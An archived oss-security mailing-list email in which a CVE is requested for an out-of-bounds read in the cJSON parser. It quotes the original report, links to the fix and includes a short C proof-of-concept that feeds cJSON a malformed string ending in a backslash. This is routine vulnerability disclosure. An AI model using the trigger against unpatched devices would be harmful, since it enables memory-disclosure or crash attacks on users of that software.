X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["918" "Monday" "7" "November" "2016" "10:46:46" "+0200" "Henri Salo" "henri@nerv.fi" "<20161107084646.GA16344@tunkki>" "32" "[oss-security] CVE request: cJSON buffer out of bound read" nil nil nil "11" "2016110708:46:46" "[oss-security] CVE request: cJSON buffer out of bound read" (number mark "U       henri@nerv.f Nov  7   32/918   " thread-indent "\"[oss-security] CVE request: cJSON buffer out of bound read\"\n") "<CAFkTriK94p6uR1j3fznZpOXVa+vOa7tLSvSMgGEDSgin7_bhMg@mail.gmail.com>" ("<CAFkTriK94p6uR1j3fznZpOXVa+vOa7tLSvSMgGEDSgin7_bhMg@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 13621 invoked by uid 550); 7 Nov 2016 08:47:02 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13603 invoked from network); 7 Nov 2016 08:47:02 -0000
X-Virus-Scanned: Debian amavisd-new at mango.nerv.fi
Date: Mon, 7 Nov 2016 10:46:46 +0200
From: Henri Salo <henri@nerv.fi>
To: cve-assign@mitre.org
Cc: oss-security@lists.openwall.com
Message-ID: <20161107084646.GA16344@tunkki>
References: <CAFkTriK94p6uR1j3fznZpOXVa+vOa7tLSvSMgGEDSgin7_bhMg@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <CAFkTriK94p6uR1j3fznZpOXVa+vOa7tLSvSMgGEDSgin7_bhMg@mail.gmail.com>
User-Agent: Mutt/1.5.23 (2014-03-12)
Subject: [oss-security] CVE request: cJSON buffer out of bound read

On Sun, Oct 02, 2016 at 08:06:25PM +0800, Marco Grassi wrote:
> I would like to report a buffer out of bound read problem in cJSON, which
> is a embeddable JSON parser, used (I imagine) in embedded devices, or even
> bigger stuff like the ps4 (
> http://doc.dl.playstation.net/doc/ps4-oss/cjson.html).
> 
> patch:
> https://github.com/DaveGamble/cJSON/commit/94df772485c92866ca417d92137747b2e3b0a917
> 
> issue:
> https://github.com/DaveGamble/cJSON/issues/30
> 
> Poc with the malformed string
> 
> #include <stdio.h>
> #include <stdint.h>
> #include <fcntl.h>
> #include "cJSON.h"
> 
> static const char *my_json = "\"000000000000000000\\";
> 
> int main(int argc, const char * argv[]) {
>     cJSON * root = cJSON_Parse(my_json);
>     char * rendered = cJSON_Print(root);
>     printf("%s\n", rendered);
>     return 0;
> }

MITRE can you assign a CVE identifier for this vulnerability, thank you?

-- 
Henri Salo
